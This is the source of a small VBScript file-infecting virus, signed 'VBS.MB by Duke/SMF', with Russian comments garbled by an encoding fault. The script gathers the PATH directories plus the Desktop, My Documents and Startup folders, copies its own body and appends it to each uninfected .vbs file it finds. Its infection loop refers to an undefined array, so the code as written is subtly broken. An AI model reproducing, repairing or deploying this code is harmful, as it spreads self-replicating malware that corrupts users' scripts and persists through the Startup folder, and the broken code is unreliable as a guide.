'^
On Error Resume Next
Dim FSO, Vir, SI
Dim Bug(200)                         'массив из строк дл€ списка каталогов
Dim TP                               'текуща€ позици€ €чейки в массиве

Set WSHShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WSHShell.Environment("Process")
MB11 = WshSysEnv("Path")                       'переменна€ окружени€ PATH
Set FSO = CreateObject("Scripting.FileSystemObject")
FN = Wscript.ScriptFullName                    'путь до текущего файла

' —оздаем массив Bug со списком каталогов пути
' SI - символ
TP = 1
For x = Len(MB11) To 1 Step -1
   SI = Mid(MB11, x, 1)
   If SI <> ";" Then
     Bug(TP) = SI + Bug(TP)
   ElseIf SI = ";" Then
     Bug(TP) = Bug(TP) + "\"
     TP = TP + 1
   End If
Next
Bug(TP) = Bug(TP) + "\"
Bug(TP + 1) = WSHShell.SpecialFolders("Desktop") + "\"
Bug(TP + 2) = WSHShell.SpecialFolders("MyDocuments") + "\"
Bug(TP + 3) = WSHShell.SpecialFolders("Startup") + "\"
Bug(TP + 4) = Left(FN, InStrRev(FN, "\"))

'Buf - буфер дл€ тела вируса
'Met - метка начала вируса
'Vir - чистый вирус
Set TS = FSO.OpenTextFile(FN, 1)      'открыли дл€ чтени€ файл с вирусом
Buf = TS.ReadAll                      'считали файл в Buf
TS.Close                              'закрыли файл
Met = Chr(94)                         'метка дл€ проверки
endMet = "'" & Met                    'полна€ начальна€ метка
For x = Len(Buf) To 1 Step -1         'Ќачина€ с конца провер€ем Buf
   If Mid(Buf, x, 1) = Met Then       '≈сли дошли до метки, то вирус выделен
      x = 1
      Vir = endMet + Vir
   ElseIf Mid(Buf, x, 1) <> Met Then  '≈сли до метки не дошли, то добавл€ем
      Vir = Mid(Buf, x, 1) + Vir      'текущий символ в телу вируса
   End If
Next

'TS   - поражаемый файл
'Body - тело жертвы
For y = 1 To (TP + 4)                                      'перебор списка каталогов
   For Each Target In FSO.GetFolder(MB5(y)).Files          'перебор всех файлов в каталоге
   If UCase(Right(Target.Name, 3)) = "VBS" Then            'если *.VBS
      Body = ""
      Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 1)   'открыли дл€ чтени€
      Body = TS.ReadAll                                    'считали тело жертвы
      TS.Close                                             'закрыли жертву
      If mid(Body,len(Body),1) <> "F" Then                 'ѕровер€ем жертву на зараженность
        Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 8) 'открыли дл€ дополнени€
        TS.Write Vir                                       'записали вирус
        TS.Close                                           'закрыли жертву
      End If
   End If
   Next
Next
'VBS.MB by Duke/SMF